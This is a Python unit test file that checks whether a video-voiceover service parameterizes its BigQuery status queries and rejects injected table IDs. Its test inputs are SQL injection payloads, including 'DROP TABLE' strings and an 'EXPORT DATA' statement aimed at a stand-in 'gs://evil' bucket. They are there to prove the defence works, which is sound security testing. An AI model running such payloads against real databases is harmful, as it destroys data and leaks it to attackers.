# Copyright 2024 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Unit tests for VideoVoiceover BigQuery query safety."""

import os
import sys
import types
import unittest
from unittest import mock


def _install_import_fakes_if_needed() -> None:
  """Installs lightweight module fakes when cloud/audio deps are absent."""
  repo_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
  service_dir = os.path.join(repo_root, "service")
  for path in (repo_root, service_dir):
    if path not in sys.path:
      sys.path.insert(0, path)

  google_pkg = sys.modules.setdefault("google", types.ModuleType("google"))

  if "google.api_core.exceptions" not in sys.modules:
    api_core_mod = sys.modules.setdefault(
        "google.api_core", types.ModuleType("google.api_core")
    )
    exceptions_mod = types.ModuleType("google.api_core.exceptions")

    class ResourceExhausted(Exception):  # pylint: disable=g-bad-exception-name
      pass

    exceptions_mod.ResourceExhausted = ResourceExhausted
    api_core_mod.exceptions = exceptions_mod
    google_pkg.api_core = api_core_mod
    sys.modules["google.api_core.exceptions"] = exceptions_mod

  cloud_pkg = sys.modules.get("google.cloud")
  if cloud_pkg is None:
    cloud_pkg = types.ModuleType("google.cloud")
    google_pkg.cloud = cloud_pkg
    sys.modules["google.cloud"] = cloud_pkg

  bq_mod = sys.modules.get("google.cloud.bigquery")
  if bq_mod is None or not all(
      hasattr(bq_mod, attr)
      for attr in ("Client", "QueryJobConfig", "ScalarQueryParameter")
  ):
    if bq_mod is None:
      bq_mod = types.ModuleType("google.cloud.bigquery")
      sys.modules["google.cloud.bigquery"] = bq_mod
    cloud_pkg.bigquery = bq_mod

    class ScalarQueryParameter:

      def __init__(self, name, type_, value):
        self.name = name
        self.type_ = type_
        self.value = value

    class QueryJobConfig:

      def __init__(self, query_parameters=None):
        self.query_parameters = list(query_parameters or [])

    class Client:

      def __init__(self, project=None):
        self.project = project

      def query(self, query, job_config=None):
        raise NotImplementedError

      def close(self):
        pass

    bq_mod.ScalarQueryParameter = ScalarQueryParameter
    bq_mod.QueryJobConfig = QueryJobConfig
    bq_mod.Client = Client
    for mod_name in ("voiceover_utils", "service.voiceover_utils"):
      utils_mod = sys.modules.get(mod_name)
      if utils_mod is not None:
        utils_mod.bigquery = bq_mod

  if "google.cloud.storage" not in sys.modules:
    storage_mod = types.ModuleType("google.cloud.storage")
    cloud_pkg.storage = storage_mod
    sys.modules["google.cloud.storage"] = storage_mod

  if "google.cloud.texttospeech" not in sys.modules:
    tts_mod = types.ModuleType("google.cloud.texttospeech")

    class SsmlVoiceGender:
      MALE = "MALE"
      FEMALE = "FEMALE"

    tts_mod.SsmlVoiceGender = SsmlVoiceGender
    cloud_pkg.texttospeech = tts_mod
    sys.modules["google.cloud.texttospeech"] = tts_mod

  if "librosa" not in sys.modules:
    librosa_mod = types.ModuleType("librosa")
    librosa_mod.get_duration = lambda path: 1.0
    sys.modules["librosa"] = librosa_mod

  if "vertexai.generative_models" not in sys.modules:
    vertexai_mod = sys.modules.setdefault(
        "vertexai", types.ModuleType("vertexai")
    )
    gen_models_mod = types.ModuleType("vertexai.generative_models")

    class _HarmCategory:
      HARM_CATEGORY_HATE_SPEECH = 1
      HARM_CATEGORY_DANGEROUS_CONTENT = 2
      HARM_CATEGORY_SEXUALLY_EXPLICIT = 3
      HARM_CATEGORY_HARASSMENT = 4

    class _HarmBlockThreshold:
      BLOCK_NONE = 0

    class SafetySetting:
      HarmCategory = _HarmCategory  # pylint: disable=invalid-name
      HarmBlockThreshold = _HarmBlockThreshold  # pylint: disable=invalid-name

      def __init__(self, category=None, threshold=None):
        self.category = category
        self.threshold = threshold

    class Part:

      @staticmethod
      def from_uri(uri, mime_type=None):
        return (uri, mime_type)

    gen_models_mod.SafetySetting = SafetySetting
    gen_models_mod.Part = Part
    gen_models_mod.TextGenerationModel = object
    gen_models_mod.GenerationConfig = object
    gen_models_mod.SafetySettings = object
    vertexai_mod.generative_models = gen_models_mod
    sys.modules["vertexai.generative_models"] = gen_models_mod


_install_import_fakes_if_needed()

from service import video_voiceover  # pylint: disable=g-import-not-at-top


class _FakeQueryJob:
  """In-memory fake BigQuery QueryJob."""

  def __init__(self):
    self.awaited = False

  def result(self):
    self.awaited = True
    return iter([])


class _RecordingBigQueryClient:
  """In-memory fake BigQuery client recording SQL queries and job configs."""

  def __init__(self, error=None):
    self.calls = []
    self.jobs = []
    self._error = error

  def query(self, sql, job_config=None):
    self.calls.append((sql, job_config))
    if self._error is not None:
      raise self._error
    job = _FakeQueryJob()
    self.jobs.append(job)
    return job

  def close(self):
    pass


class _FailingBlob:
  """In-memory fake GCS blob that raises FileNotFoundError on download."""

  def download_to_filename(self, unused_filename):
    raise FileNotFoundError("simulated missing GCS input object")


class _FailingBucket:
  """In-memory fake GCS bucket returning _FailingBlob."""

  def blob(self, unused_name):
    return _FailingBlob()


class _FailingGCSClient:
  """In-memory fake GCS client returning _FailingBucket."""

  def bucket(self, unused_name):
    return _FailingBucket()


class VideoVoiceoverBigQuerySecurityTest(unittest.TestCase):
  """Tests for BigQuery parameterization in VideoVoiceover status updates."""

  def _make_voiceover_without_init(
      self,
      *,
      video_id="clip1",
      version="1",
      tmp_table_id="temp_5d41402abc4b2a76b9719d911017c592",
  ):
    """Allocates a bare VideoVoiceover instance without running __post_init__."""
    vv = object.__new__(video_voiceover.VideoVoiceover)
    vv.video_id = video_id
    vv.version = version
    vv.tmp_table_id = tmp_table_id
    return vv

  def test_post_init_failure_parameterizes_sqli_video_id_and_version(self):
    """Verifies __post_init__ failure path parameterizes video_id and version."""
    injected_video_id = "x'; DROP TABLE p.d.VH_SQLI_canary; SELECT 'pad"
    injected_version = (
        "1'; EXPORT DATA OPTIONS(uri='gs://evil/x') AS SELECT 1; --"
    )
    fake_client = _RecordingBigQueryClient()

    with mock.patch.object(
        video_voiceover.voiceover_utils.bigquery,
        "Client",
        return_value=fake_client,
    ):
      with self.assertRaisesRegex(
          RuntimeError, "Failed to initialize VideoVoiceover"
      ):
        video_voiceover.VideoVoiceover(
            gemini_pro_model=object(),
            tts_client=object(),
            gcs_client=_FailingGCSClient(),
            trix_id="trix",
            video_id=injected_video_id,
            client_name="client",
            yyyymmdd="20260101",
            version=injected_version,
            language_name="English",
            language_code="en",
            language_full_name="English",
            voice_id="v1",
            voice_gender="MALE",
            original_video_has_vocal_dubbing="NO",
            voiceover_script_context_prompt="",
            tmp_path="/tmp",
            gcs_bucket_name="bkt",
            gcs_top_level_folder="top",
            tmp_table_id="temp_5d41402abc4b2a76b9719d911017c592",
            err_msg="",
        )

    self.assertEqual(len(fake_client.calls), 2)
    update_sql, update_config = fake_client.calls[0]
    self.assertNotIn("VH_SQLI_canary", update_sql)
    self.assertNotIn("DROP TABLE", update_sql)
    self.assertNotIn("EXPORT DATA", update_sql)
    self.assertIn(
        "UPDATE"
        " `YOUR_PROJECT_ID.YOUR_BQ_DATASET.temp_5d41402abc4b2a76b9719d911017c592`",
        update_sql,
    )
    self.assertIn("SET status = @new_status", update_sql)
    self.assertIn(
        "WHERE video_id = @video_id AND version = @version", update_sql
    )
    params = {
        p.name: (p.type_, p.value) for p in update_config.query_parameters
    }
    self.assertEqual(
        params,
        {
            "new_status": ("STRING", "GENERATE_FAILED"),
            "video_id": ("STRING", injected_video_id),
            "version": ("STRING", injected_version),
        },
    )
    self.assertTrue(fake_client.jobs[0].awaited)

  def test_update_status_coerces_numeric_video_id_and_version_to_strings(self):
    """Verifies numeric video_id and version are coerced to STRING parameters."""
    vv = self._make_voiceover_without_init(
        video_id=123456, version=2, tmp_table_id="tmp_tbl"
    )
    fake_client = _RecordingBigQueryClient()

    with mock.patch.object(
        video_voiceover.voiceover_utils.bigquery,
        "Client",
        return_value=fake_client,
    ):
      vv.update_status_in_temp_table("GENERATE_SUCCESS")

    self.assertEqual(len(fake_client.calls), 1)
    _, job_config = fake_client.calls[0]
    params = {p.name: (p.type_, p.value) for p in job_config.query_parameters}
    self.assertEqual(
        params,
        {
            "new_status": ("STRING", "GENERATE_SUCCESS"),
            "video_id": ("STRING", "123456"),
            "version": ("STRING", "2"),
        },
    )
    self.assertTrue(fake_client.jobs[0].awaited)

  def test_update_status_rejects_backtick_injection_in_tmp_table_id(self):
    """Verifies backtick injection in tmp_table_id raises ValueError."""
    vv = self._make_voiceover_without_init(
        tmp_table_id="tmp_tbl`; DROP TABLE p.d.t; --"
    )
    fake_client = _RecordingBigQueryClient()

    with mock.patch.object(
        video_voiceover.voiceover_utils.bigquery,
        "Client",
        return_value=fake_client,
    ):
      with self.assertRaisesRegex(ValueError, "invalid BigQuery table_id"):
        vv.update_status_in_temp_table("GENERATE_FAILED")

    self.assertEqual(fake_client.calls, [])

  def test_update_status_rejects_empty_tmp_table_id(self):
    """Verifies empty tmp_table_id raises ValueError before querying."""
    vv = self._make_voiceover_without_init(tmp_table_id="")
    fake_client = _RecordingBigQueryClient()

    with mock.patch.object(
        video_voiceover.voiceover_utils.bigquery,
        "Client",
        return_value=fake_client,
    ):
      with self.assertRaisesRegex(ValueError, "invalid BigQuery table_id"):
        vv.update_status_in_temp_table("GENERATE_FAILED")

    self.assertEqual(fake_client.calls, [])

  def test_update_status_reraises_bigquery_query_error(self):
    """Verifies BigQuery client query errors propagate to the caller."""
    vv = self._make_voiceover_without_init()
    fake_client = _RecordingBigQueryClient(error=RuntimeError("BQ unavailable"))

    with mock.patch.object(
        video_voiceover.voiceover_utils.bigquery,
        "Client",
        return_value=fake_client,
    ):
      with self.assertRaisesRegex(RuntimeError, "BQ unavailable"):
        vv.update_status_in_temp_table("GENERATE_FAILED")


if __name__ == "__main__":
  unittest.main()
